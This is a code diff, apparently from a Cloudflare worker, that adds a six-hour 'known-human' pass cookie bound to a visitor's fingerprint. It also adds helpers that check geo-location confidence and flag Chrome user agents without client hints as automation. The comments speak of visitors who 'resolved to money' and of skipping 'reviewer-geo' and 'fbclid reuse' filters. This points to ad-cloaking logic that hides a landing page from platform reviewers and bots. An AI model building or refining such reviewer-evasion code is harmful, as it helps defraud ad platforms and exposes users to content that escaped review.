@@ -172,6 +172,40 @@ function coherenceScore(ua: string, acceptLang: string, secChUa: string, secChMo
   return Math.max(0, Math.min(100, score));
 }
 
+// --- Known-human pass (sleepox parity) -------------------------------------
+// A visitor that already resolved to `money` gets a 6h pass cookie bound to their
+// fingerprint. Every later hit skips the SOFT filters (velocity, fbclid reuse,
+// reviewer-geo, cold-desktop), which is what fixed reload / duplicate-tab loss.
+const HUMAN_COOKIE = "_sxh";
+const HUMAN_TTL_SEC = 6 * 60 * 60;
+
+function readCookie(request: Request, name: string): string {
+  const raw = request.headers.get("cookie") || "";
+  for (const part of raw.split(";")) {
+    const [k, ...v] = part.trim().split("=");
+    if (k === name) return decodeURIComponent(v.join("="));
+  }
+  return "";
+}
+
+function humanPassCookie(fingerprint: string, secure: boolean): string {
+  return `${HUMAN_COOKIE}=${encodeURIComponent(fingerprint)}; Max-Age=${HUMAN_TTL_SEC}; Path=/; SameSite=Lax; HttpOnly${secure ? "; Secure" : ""}`;
+}
+
+// Cloudflare returns XX / T1 when it cannot geo-locate (Tor, unknown, some carriers).
+// Reviewer-geo rules must NEVER fire on an unconfident country.
+function isCountryConfident(country: string): boolean {
+  return /^[A-Z]{2}$/.test(country) && country !== "XX" && country !== "T1";
+}
+
+// Chrome-family UA that did NOT send sec-ch-ua = headless / spoofed automation signal.
+function isChromeWithoutClientHints(ua: string, secChUa: string): boolean {
+  if (!/chrome\/|edg\//i.test(ua)) return false;
+  if (/opr\/|yabrowser|samsungbrowser/i.test(ua)) return false;
+  return !secChUa;
+}
+
+
 function isBackendAllowed(url: string): boolean {
   try {
     const parsed = new URL(url);
